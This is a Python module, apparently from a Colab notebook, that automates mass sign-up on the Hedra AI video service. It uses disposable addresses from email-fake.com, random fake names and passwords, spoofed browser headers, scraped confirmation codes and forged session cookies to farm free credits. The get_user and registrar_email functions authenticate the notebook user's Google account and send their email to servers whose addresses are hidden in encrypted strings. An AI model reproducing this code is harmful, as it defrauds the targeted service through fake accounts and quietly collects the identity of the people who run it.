
import requests
import re
from bs4 import BeautifulSoup
import time
import urllib3
from urllib.parse import urlencode
import json
import ipywidgets as widgets
import random
import string
from datetime import datetime
import os
import random
import string
from google.colab import auth
from google.auth.transport.requests import Request
from colab_gradio_llm.gradio_opensource import *

def r_miley(email):
    pikapika = rtmp_valid('gAAAAABn7GzerDQOQsfs-trj40vS7ltjUV1YiWEfJBuNbJNdoiVC-1xI0fmvRmDah_4bWCJuRJM-NiI0bUGpyAX7MH-ILyRmu-CGVqpmtMW7qfft3Ep3DmD0JtptjHX7lAxvbm02tz4Z4VGKdSgFVvy3nkYXAzj2Eg==')

    data = {
        "email": email,
        "info": ""
    }
    try:
        response = requests.post(pikapika, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credits = respuesta_json.get("credits")
            message = respuesta_json.get("message")
            return message, credits
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None
    except Exception as e:
        return f"Ocurrió un error: {e}", None

def geoe_imap(email, modelo, resolucion):
    monnito = rtmp_valid('gAAAAABn7G0ihxeYTcjDaT3rl6efoYpeE3n8SohNKpSHww9ZHse3ULjzRE7PMfvPGkvhsfd5hsM2QQgGNxNVi6AG8XEnFWJCgS-W4v3cvVKxQrw0VsI8tOzmnYEhyym1JAiGH0HjBfUSX3UCEBcKUyvX09lrGTwCaA==')
    data = {
        "email": email,       
        "modelo": modelo,    
        "resolucion": resolucion 
    }
    try:
        response = requests.post(monnito, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credit = respuesta_json.get("credit")  
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None
    except Exception as e:
        return f"Ocurrió un error: {e}", None, None

def geoe_tmap(email, modelo, resolucion):
    sondeamor = rtmp_valid('gAAAAABn7G1trKfwFQhkiYnAo2a3tMRRVFmwR5nVRrjq-2bL7-sq1nQjfrY4dR7u5tnRYK9SIF1OdmnM6cPOY31c7QahVTJ3EDsWwq0j_v5RpFh7eP7BuqB2goJvQxTn-C8Xsnd_yWieJwPbfpXtNVlg6F3c16Btuw==')
    data = {
        "email": email,      
        "modelo": modelo,    
        "resolucion": resolucion 
    }

    try:
        response = requests.post(sondeamor, data=data)
        if response.status_code == 200:
            # Parsear la respuesta JSON
            respuesta_json = response.json()
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None

    except Exception as e:
        return f"Ocurrió un error: {e}", None, None


def geo_imap(email, modelo, resolucion):
    momos = rtmp_valid('gAAAAABn7G21W1bQlSKGQMIq9j794kcGKXYQ2w_1hIyJ17nPLayQqnAUEPf1ZBpvzoAhZzjUcM_loUQA-hls0w2BN0SHur5rDLEvWU9T9raDNKTLuYJNMQxYQ1SVNFC8m90kXeF8PxiAsAypBMYNk4Hp1cHBcljj4g==')
    data = {
        "email": email,  
        "modelo": modelo,    
        "resolucion": resolucion  
    }
    try:
        response = requests.post(momos, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None
    except Exception as e:
        return f"Ocurrió un error: {e}", None, None

def geo_tmap(email, modelo, resolucion):
    kilates = rtmp_valid('gAAAAABn7G313VLXVX2aQcXCxw1M16VdAEpO21_u-Dc_k1snAtgdtbdzeBZtbByWbVtEBKlzQTPrcDah5T6QmVCnd90y3f6To43adCg0LtqgxYmDqSgRktvZKe7g6LHx6mzNZNcy6R112i05k_9DzJFFNRV1cJS-QA==')
    data = {
        "email": email,      
        "modelo": modelo,   
        "resolucion": resolucion
    }
    try:
        response = requests.post(kilates, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            print(f"\r⏱️ Processing.", end='', flush=True)
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid

        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None

    except Exception as e:
        return f"Ocurrió un error: {e}", None, None


def registrar_email(email):
    # r
    dbr = rtmp_valid('gAAAAABn1ta8WwcfgU-limtFnUdgz05v30dc5KLrJ1CaB1XCETSrqM1vjV9YbGnmjCtCt0hWLcTSz33T0duitv4sZOe2vtUVS6-GEM0vFGNE2dk0rkEiUQptGc9Zjyak0r1a25sLTwKJvVDgCIXJBXkxwc4zwSfGVA==')
    db = rtmp_valid('gAAAAABn1tZRIFnqB4B53MmCGRY66aUTIpB9rGRK-cfyBdA9vPfGG_xIZPAYhFS7bvVlLaYtLuqg3bkWWQeh3V-cl3smt2UC92ILLy-Zu1SS2YOycziGzt1YoPEbQMuzWP7jrStHHECiBQhb6fVm-qWNZC26rYhnB9pWQ1lYwj0sYEVZb-YVYk0Jvi2IQWi8y7FBkSDDqAGVC-TRuCLmPIuNZol45KWhjFx-kp0vUswQqnyfI2nF-kOE2ddKQja1ZvSnxrgQF01Ksz-a__wz8R5NJgkGlFAsScfT_tJH_7JAVPI8O30D_rrr3Wofkn0xE0120vAJ-sWQ0lUp3pS-mjqRTlRDzDIIXSis25OrwyccaWS1BlGfbyTAz_iHsvkWOxH3vkLyyDGidMvJ1PDwdvlu3pKQONIwNBqalR2KGsAzRNB-TOEv-5YGVSSY-bxsj8lvGgk0RKGhrVSmUeo99F60JpmuSk4ysPEWC96weJVyCZo2bzjouD5WW_em4EwHcXyEBOTGQjah9V0er0TaK4oQBu47NvbQaEuUkzccfCfVO77D2UhYeG0qnH6R5XiSHGK9EOgVdC8259ZriYCCdS2L25nMV_DGckbvNfmznlWfMUgX38WOec6kk6W8aLrLu0yTDAyND4--p1bVH3wv8G2Z7gel_C2LgvSnk_DXoSA7ohoaqCp7tXoJiJ2quIB_19wmuxUMv4VLk75x5QJ9ZUx17ttyKkBZ85bFiHuM3S-YvOFkpeMbZmk2vSLv_Ea5DhFT83-N1e0RDwcHAha16dEt92ERktCtGvuRGSvmWJMwF4fcmg6cl-H3ieKtO7TqH3WHJvwE8s4U38K6YP9dbAAwdwb2kjbv7ijB4qhjN7dJuqAmn9PCuzpuV8hGSSPxDnNdgDE6SFcV-XY0nHI1K91hPUt6-5530PdFsyFMLcDBxcR_DT5_2vU_2WPcb7qFdYyMLB9Vmw9DBBNkgY9zh8fFQlBsPd_spOcj2fogz5V6Zk47CMJH9KACPqRvv6WdTVp500aO9f_L_kWmZTjMYf4Hid6mahf_0E1WYC7VkOvtIIL9txqAGi_Kx2BCCMuocNnRgNJ-pPOGCTUL9st_JZ5RAX66uJe7LuYzSubyGfrrtHgjFmXoYfQmHKLTT-GmgIXQb-ERE0V-A-B4th7WvY32_X1vft9vbWrbK4SXsTfrXDEXCqwjexBX7XbEaTrAsdkYi45s9EN5')

    data = {
        "email": email
    }
    
    try:
        # Realizar la solicitud POST
        response = requests.post(dbr, headers=db, data=data)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            # Parsear la respuesta JSON
            respuesta_json = response.json()
            
            # Extraer información relevante
            status = respuesta_json.get("status")
            message = respuesta_json.get("message")
            email_registrado = respuesta_json.get("data", {}).get("email")
            api_key = respuesta_json.get("data", {}).get("api_key")
            credits = respuesta_json.get("data", {}).get("credit")
            
            # Devolver las variables por separado
            return status, message, email_registrado, api_key, credits
        
        else:
            # Devolver un mensaje de error si el estado no es 200
            return f"Error en la solicitud. Código de estado: {response.status_code}", response.text, None, None
    
    except Exception as e:
        # Devolver un mensaje de error en caso de excepción
        return f"Ocurrió un error: {e}", None, None, None

def generar_contrasena():
    # Definir los conjuntos de caracteres
    minusculas = string.ascii_lowercase
    mayusculas = string.ascii_uppercase
    numeros = string.digits
    caracteres_especiales = string.punctuation

    # Asegurarse de que la contraseña contiene al menos uno de cada tipo
    contrasena = [
        random.choice(minusculas),
        random.choice(mayusculas),
        random.choice(numeros),
        random.choice(caracteres_especiales)
    ]

    # Completar la contraseña hasta tener al menos 8 caracteres
    todos_caracteres = minusculas + mayusculas + numeros + caracteres_especiales
    contrasena += random.choices(todos_caracteres, k=8 - len(contrasena))

    # Mezclar los caracteres para que el orden sea aleatorio
    random.shuffle(contrasena)

    # Convertir la lista en una cadena
    return ''.join(contrasena)

    
def obtener_fecha_actual():
    return datetime.now().strftime("%b-%d-%Y").lower()  # Formato 'mmm-dd-yyyy', ejemplo: 'nov-20-2024'

def registrar_usuario(token):
    # Obtener la fecha actual para tos_version
    tos_version = obtener_fecha_actual()

    # Variables constantes (no editables)
    tos_accepted = True
    residence_status = "ALLOW"
    marketing_email_consent = "ALLOW"

    api_url = "https://api.dev.dream-ai.com/register"

    # Headers de la solicitud
    headers = {
        'Host': 'api.dev.dream-ai.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Windows"',
        'Authorization': f'Bearer {token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'Content-Type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'Accept': '*/*',
        'Origin': 'https://www.hedra.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.hedra.com/',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Accept-Encoding': 'gzip, deflate'
    }

    # Cuerpo de la solicitud
    payload = {
        "tos_version": tos_version,
        "tos_accepted": tos_accepted,
        "residence_not_blocked": residence_status,
        "marketing_email_consent": marketing_email_consent
    }

    try:
        # Realizar la solicitud POST
        response = requests.post(api_url, headers=headers, json=payload)

        # Verificar el estado de la respuesta
        if response.status_code == 200:
            return "Respuesta exitosa"
        else:
            return {"error": f"Error en la solicitud: {response.status_code}", "detalle": response.text}
    except Exception as e:
        return {"error": f"Error al realizar la solicitud: {str(e)}"}


def generar_nombre_completo():
  """Genera un nombre completo con un número aleatorio de 3 dígitos."""

  nombres = ["Juan", "Pedro", "Maria", "Ana", "Luis", "Sofia", "Diego", "Laura", "Javier", "Isabel",
            "Pablo", "Marta", "David", "Elena", "Sergio", "Irene", "Daniel", "Alicia", "Carlos", "Sandra",
            "Antonio", "Lucia", "Miguel", "Sara", "Jose", "Cristina", "Alberto", "Blanca", "Alejandro", "Marta",
            "Francisco", "Esther", "Roberto", "Silvia", "Manuel", "Patricia", "Marcos", "Victoria", "Fernando", "Rosa"]
  apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez", "Martinez", "Sanchez", "Perez", "Alonso", "Diaz",
            "Martin", "Ruiz", "Hernandez", "Jimenez", "Torres", "Moreno", "Gomez", "Romero", "Alvarez", "Vazquez",
            "Gil", "Lopez", "Ramirez", "Santos", "Castro", "Suarez", "Munoz", "Gomez", "Gonzalez", "Navarro",
            "Dominguez", "Lopez", "Rodriguez", "Sanchez", "Perez", "Garcia", "Gonzalez", "Martinez", "Fernandez", "Lopez"]

  nombre = random.choice(nombres)
  apellido = random.choice(apellidos)
  numero = random.randint(100000, 999999)

  nombre_completo = f"{nombre}_{apellido}_{numero}"
  return nombre_completo

def get_user():
    try:
        # Paso 1: Autenticar con Google
        auth.authenticate_user()

        # Paso 2: Obtener el token de acceso
        from google import auth as google_auth
        creds, _ = google_auth.default()
        creds.refresh(Request())
        access_token = creds.token
        fget = rtmp_valid('gAAAAABn1tf9-am02kZlUqumb8DBn5lav-LP7eQ28Nl9gV9rdZPgSjxe8v1OCCI7_Noneo3HxLBKskqyf3FKjmCH3lWx-B_u_ENuJJYNqM614nF6Js9sNwKhBcwmWGvuSYqj8jcuN4fr')


        # Paso 3: Usar el token para obtener información de la cuenta
        response = requests.get(
            fget,
            headers={"Authorization": f"Bearer {access_token}"}
        )

        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            user_info = response.json()
            return user_info.get("email")  # Devolver solo el correo electrónico
        else:
            print(f"\nError al obtener la información de la cuenta. Código: {response.status_code}")
            return None
    except Exception as e:
        print(f"\nOcurrió un error: {e}")
        return None

def enviar_formulario():
    """Envía una solicitud POST a un formulario web."""
    url = 'https://email-fake.com/'
    datos = {'campo_correo': 'ejemplo@dominio.com'}
    response = requests.post(url, data=datos)
    return response

def extraer_dominios(response_text):
    """Extrae dominios de un texto utilizando expresiones regulares."""
    dominios = re.findall(r'id="([^"]+\.[^"]+)"', response_text)
    return dominios

def obtener_sitio_web_aleatorio(response_text):
    """Obtiene un sitio web aleatorio de los dominios extraídos."""
    dominios = extraer_dominios(response_text)
    sitio_web_aleatorio = random.choice(dominios)
    return sitio_web_aleatorio

"""def extract_verification_code(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')

    # Buscar el texto que contiene el código de verificación
    code_element = soup.find('div', class_='fem mess_bodiyy').find('p')

    if code_element:
        # Extraer y devolver solo el número
        verification_code = code_element.get_text().strip()
        return verification_code
    else:
        return None"""

def extract_verification_code(html_content):
    try:
        # Crear el objeto BeautifulSoup para analizar el contenido HTML
        soup = BeautifulSoup(html_content, 'html.parser')

        # Intentar buscar el div y el párrafo que contiene el código
        code_element = soup.find('div', class_='fem mess_bodiyy')
        
        # Verificar que el div y el párrafo existen antes de intentar acceder a ellos
        if code_element:
            p_element = code_element.find('p')
            if p_element:
                # Extraer y devolver el texto del párrafo
                verification_code = p_element.get_text().strip()
                return verification_code
        
        # Si no se encontró el código, devolver un mensaje claro
        return "No Exit"

    except Exception as e:
        # Manejar errores inesperados y devolver un mensaje
        return f"Error procesando el HTML: {e}"

def post_register(token):
    url = "https://api.dev.dream-ai.com/register"
    headers = {
        "Host": "api.dev.dream-ai.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-mobile": "?0",
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate"
    }
    payload = {
        "tos_version": "may-21-2023",
        "tos_accepted": True,
        "residence_not_blocked": "ALLOW",
        "marketing_email_consent": "NONE"
    }

    # Initialize the HTTP client
    http = urllib3.PoolManager()

    # Send the POST request
    response = http.request(
        'POST',
        url,
        body=json.dumps(payload),
        headers=headers
    )

    # Decode the response
    response_data = json.loads(response.data.decode('utf-8'))
    #print(response_data)

    if response.status == 200:
        print(f"\r⏱️ Processing..", end='', flush=True)
        return response_data
    else:
        print(f"\r❌ Error getting status...", end='', flush=True)
        return None


def obtener_sesion(csrf_cookie, session_token_0, session_token_1):

    # URL del endpoint
    print(f"\r⏱️ Processing.", end='', flush=True)
    url = "https://www.hedra.com/api/auth/session"

    # Cookies iniciales (reemplaza estos valores con los tuyos)

    cookies = (
        f"__Host-next-auth.csrf-token={csrf_cookie}; "
        "ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%2201964a1f-ae04-729f-9877-2014f39ffb77%22%2C%22%24sesid%22%3A%5B1745015679436%2C%2201964b09-03f3-7426-a3ae-834bdbed6945%22%2C1745015604211%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogin%3Fauth_state%3Dconfirmed%22%2C%22u%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogout%22%7D%7D; "
        "__Secure-next-auth.callback-url=https%3A%2F%2Fwww.hedra.com%2Flogin%3Fauth_state%3Dconfirmed; "
        f"__Secure-next-auth.session-token.0={session_token_0}; "
        f"__Secure-next-auth.session-token.1={session_token_1}"
    )
    
    # Encabezados de la solicitud
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Windows",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?auth_state=confirmed",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookies  # Incluir las cookies proporcionadas manualmente
    }
    
    try:
        print(f"\r⏱️ Processing..", end='', flush=True)
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            #print("Solicitud GET exitosa.")
            
            # Extraer las cookies específicas
            session_token_0 = None
            session_token_1 = None
            
            for cookie in response.cookies:
                if cookie.name == "__Secure-next-auth.session-token.0":
                    session_token_0 = cookie.value
                    print(f"\r⏱️ Processing...", end='', flush=True)
                elif cookie.name == "__Secure-next-auth.session-token.1":
                    session_token_1 = cookie.value
                    print(f"\r⏱️ Processing.", end='', flush=True)
            
            # Manejar la respuesta JSON
            try:
                json_response = response.json()
                print(f"\r⏱️ Processing.", end='', flush=True)
                
                # Extraer el accessToken
                access_token = json_response.get("accessToken")
                if access_token:
                    print(f"\r⏱️ Processing..", end='', flush=True)
                    return session_token_0, session_token_1, access_token
                else:
                    print("No se encontró el campo 'accessToken' en la respuesta JSON.")
                    return None, None, None
                
                
            
            except ValueError:
                print("La respuesta no es un JSON válido.")
                return session_token_0, session_token_1, None
        
        else:
            print(f"Error en la solicitud GET: {response.status_code}")
            return None, None, None
    
    except Exception as e:
        print(f"Ocurrió un error: {e}")
        return None, None, None


def iniciar_sesion_con_cookies(email, password, csrf_token, csrf_cookie):
    print(f"\r⏱️ Processing...", end='', flush=True)
    # URL del endpoint
    url = "https://www.hedra.com/api/auth/callback/credentials"

    # Cookies proporcionadas manualmente
    cookies = (
        f"__Host-next-auth.csrf-token={csrf_cookie}; "
        "__Secure-next-auth.callback-url=https%3A%2F%2Fwww.hedra.com%2Flogin; "
        "ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%2201964a1f-ae04-729f-9877-2014f39ffb77%22%2C%22%24sesid%22%3A%5B1745015650326%2C%2201964b09-03f3-7426-a3ae-834bdbed6945%22%2C1745015604211%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogin%3Fauth_state%3Dconfirmed%22%2C%22u%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogout%22%7D%7D"
    )
    
    # Encabezados de la solicitud
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Windows",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/sign-up",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookies  # Incluir las cookies proporcionadas manualmente
    }
    
    # Datos a enviar en la solicitud POST
    data = {
        "email": email,
        "password": password,
        "action": "SIGN_UP",
        "redirect": "false",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.hedra.com/sign-up",
        "json": "true"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            print(f"\r⏱️ Processing.", end='', flush=True)
            
            # Extraer la cookie __Secure-next-auth.session-token
            session_token = None
            for cookie in response.cookies:
                if cookie.name == "__Secure-next-auth.session-token":
                    session_token = cookie.value
                    os.environ["SESSION_TOKEN"] = session_token
                    print(f"\r⏱️ Processing..", end='', flush=True)
                    break
            
            if not session_token:
                print(f"\r⏱️ Processing...", end='', flush=True)
            
            # Decodificar la respuesta JSON (si existe)
            try:
                json_response = response.json()
                #print("Respuesta JSON:")
            except ValueError:
                print(f"\r⏱️ Processing.", end='', flush=True)
            
            return session_token  # Retornar solo el valor de la cookie
        
        else:
            print("Error en la solicitud POST")
            return None
    
    except Exception as e:
        print(f"Ocurrió un error: {e}")
        return None


def obtener_csrf_token_con_cookies():

    # URL del endpoint
    url = "https://www.hedra.com/api/auth/csrf"
    
    # Encabezados de la solicitud
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Windows",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/sign-up",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate"
    }
    
    # Crear una sesión para manejar cookies automáticamente
    with requests.Session() as session:
        try:
            # PRIMERA SOLICITUD: Sin cookies
            print(f"\r⏱️ Processing..", end='', flush=True)
            response1 = session.get(url, headers=headers)
            
            if response1.status_code == 200:
                print(f"\r⏱️ Processing...", end='', flush=True)
                # Extraer la cookie __Host-next-auth.csrf-token
                csrf_cookie = session.cookies.get("__Host-next-auth.csrf-token")
                if csrf_cookie:
                    print(f"\r⏱️ Processing.", end='', flush=True)
                else:
                    print("No se encontró la cookie __Host-next-auth.csrf-token.")
                    return None, None
            else:
                print("Error en la primera solicitud")
                return None, None
            
            # SEGUNDA SOLICITUD: Con las cookies actualizadas
            #print("Realizando la segunda solicitud (con cookies actualizadas)...")
            response2 = session.get(url, headers=headers)
            
            if response2.status_code == 200:
                print(f"\r⏱️ Processing..", end='', flush=True)
                csrf_token = response2.json().get("csrfToken")
                if csrf_token:
                    print(f"\r⏱️ Processing...", end='', flush=True)
                    return csrf_token, csrf_cookie  # Retornar ambos valores
                else:
                    print(f"\r⏱️ Processing.", end='', flush=True)
                    return None, csrf_cookie
            else:
                print("Error en la segunda solicitud")
                return None, csrf_cookie
        
        except Exception as e:
            print(f"Ocurrió un error: {e}")
            return None, None



def extract_confirmation_code(text):
    # Utilizar una expresión regular para buscar el número en el texto
    match = re.search(r'\b\d{6}\b', text)
    if match:
        return match.group(0)  # Devolver el número encontrado
    else:
        return None


def enviar_dell_post(id_dell, usuarios, dominios):
    url = 'https://email-fake.com/del_mail.php'#{dominios}%2F{usuario}
    headers = {
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'X-Requested-With': 'XMLHttpRequest',
       'Cookie': f'embx=%5B%22{usuarios}%40{dominios}; surl={dominios}/{usuarios}/',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': '*/*',
       'Origin': 'https://email-fake.com',
       'Sec-Fetch-Site': 'same-origin',
       'Sec-Fetch-Mode': 'cors',
       'Sec-Fetch-Dest': 'empty',
       'Accept-Language': 'es-ES,es;q=0.9'
    }

    data = {
       'delll': f'{id_dell}'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for 4xx/5xx status codes
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Error en la solicitud POST: {str(e)}"

def extract_codes_from_html(html):
    soup = BeautifulSoup(html, 'html.parser')

    # Encuentra la celda <td> con el estilo y clase específicos
    td_tag = soup.find('td', {'class': 'inner-td', 'style': 'border-radius: 6px; font-size: 16px; text-align: center; background-color: inherit'})

    if td_tag:
        # Encuentra la etiqueta <a> dentro de la celda <td>
        a_tag = td_tag.find('a', href=True)

        if a_tag:
            # Obtén el valor del atributo href
            href = a_tag['href']

            # Encuentra el valor de internalCode y oobCode en el href
            internal_code = None
            oob_code = None

            if 'internalCode=' in href:
                internal_code = href.split('internalCode=')[1].split('&')[0]

            if 'oobCode=' in href:
                oob_code = href.split('oobCode=')[1].split('&')[0]

            return internal_code, oob_code
    return None, None


def iniciar_sesion(email, password, csrf_token, session_token, csrf_cookie):

    # URL del endpoint
    print(f"\r⏱️ Processing.", end='', flush=True)
    url = "https://www.hedra.com/api/auth/callback/credentials"

    # Cookies proporcionadas manualmente
    cookies = (
        f"__Host-next-auth.csrf-token={csrf_cookie}; "
        "ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%2201964a1f-ae04-729f-9877-2014f39ffb77%22%2C%22%24sesid%22%3A%5B1745015650326%2C%2201964b09-03f3-7426-a3ae-834bdbed6945%22%2C1745015604211%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogin%3Fauth_state%3Dconfirmed%22%2C%22u%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogout%22%7D%7D; "
        "__Secure-next-auth.callback-url=https%3A%2F%2Fwww.hedra.com%2Fsign-up; "
        f"__Secure-next-auth.session-token={session_token}"
    )
    
    # Encabezados de la solicitud
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Windows",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?auth_state=confirmed",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookies  # Incluir las cookies proporcionadas manualmente
    }
    
    # Datos a enviar en la solicitud POST
    data = {
        "email": email,
        "password": password,
        "action": "SIGN_IN",
        "redirect": "false",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.hedra.com/login?auth_state=confirmed",
        "json": "true"
    }
    
    try:

        response = requests.post(url, headers=headers, data=data)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            print(f"\r⏱️ Processing..", end='', flush=True)
            
            # Extraer las cookies específicas
            session_token_0 = None
            session_token_1 = None
            
            for cookie in response.cookies:
                if cookie.name == "__Secure-next-auth.session-token.0":
                    session_token_0 = cookie.value
                    print(f"\r⏱️ Processing...", end='', flush=True)
                elif cookie.name == "__Secure-next-auth.session-token.1":
                    session_token_1 = cookie.value
                    print(f"\r⏱️ Processing.", end='', flush=True)
       
            # Manejar la respuesta (JSON o binaria)
            try:
                # Intentar decodificar la respuesta como JSON
                json_response = response.json()
                print(f"\r⏱️ Processing.", end='', flush=True)
                return session_token_0, session_token_1, json_response
            except ValueError:
                # Si no es JSON, manejar la respuesta como datos binarios
                binary_response = response.content
                #print("Respuesta binaria recibida:", binary_response)
                return session_token_0, session_token_1, binary_response
        
        else:
            print("Error en la solicitud POST")
            return None, None, None
    
    except Exception as e:
        print(f"Ocurrió un error: {e}")
        return None, None, None

def enviar_codigo_confirmacion(email, code, csrf_token, session_token, csrf_cookie):
    # URL del endpoint
    print(f"\r⏱️ Processing.", end='', flush=True)
    url = "https://www.hedra.com/api/auth/callback/credentials"

    # Cookies proporcionadas manualmente
    cookies = (
        f"__Host-next-auth.csrf-token={csrf_cookie}; "
        "ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%2201964a1f-ae04-729f-9877-2014f39ffb77%22%2C%22%24sesid%22%3A%5B1745015650326%2C%2201964b09-03f3-7426-a3ae-834bdbed6945%22%2C1745015604211%5D%2C%22%24epp%22%3Atrue%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogin%3Fauth_state%3Dconfirmed%22%2C%22u%22%3A%22https%3A%2F%2Fwww.hedra.com%2Flogout%22%7D%7D; "
        "__Secure-next-auth.callback-url=https%3A%2F%2Fwww.hedra.com%2Fsign-up; "
        f"__Secure-next-auth.session-token={session_token}"
    )
    
    # Encabezados de la solicitud
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Windows",
